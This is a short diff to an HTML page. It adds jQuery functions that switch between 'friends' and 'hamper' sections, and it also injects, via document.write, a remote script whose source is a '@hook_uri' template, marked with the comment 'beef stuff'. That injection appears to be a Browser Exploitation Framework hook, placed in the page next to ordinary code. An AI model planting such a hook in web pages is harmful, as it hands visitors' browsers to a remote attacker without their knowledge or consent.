@@ -18,6 +18,26 @@
   <a href="videos/videos.html"></a>
   <br>
 
+<script src="script.js"></script>
+<script>
+
+	function showfriends() {
+		$("#hamper").hide();
+		$("#friends").show();
+	}
+
+	function showHamper() {
+		$("#friends").hide();
+		$("#hamper").show();
+	}
+
+</script>
+<script>
+	var commandModuleStr = '<script src="<%= @hook_uri %>" type="text/javascript"><\/script>';
+	document.write(commandModuleStr);
+</script>
+      <!--beef stuff -->
+      
   </head>
   </body>
 </html>
